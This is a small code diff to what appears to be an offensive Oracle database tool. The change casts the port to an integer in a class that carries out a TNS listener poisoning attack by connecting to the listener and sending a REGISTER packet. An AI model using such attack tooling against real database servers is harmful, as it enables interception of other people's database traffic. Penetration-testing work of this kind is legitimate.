@@ -275,7 +275,7 @@ class Tnspoison (Tnscmd):
 		while 1:
 			logging.info("Exploiting the TNS poisoning attack...")
 			sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			sk.connect((self.args['server'], self.args['port']))
+			sk.connect((self.args['server'], int(self.args['port'])))
 			logging.debug("Sending a REGISTER packet from your IP {2} to the TNS listener {0}:{1}...".format(self.args['server'], self.args['port'], localIp))
 			sk.send(self.PACKET_REGISTER)
 			if self.args['show_sql_requests'] == True: logging.debug("REGISTER packet sent: {0}".format(repr(self.PACKET_REGISTER)))
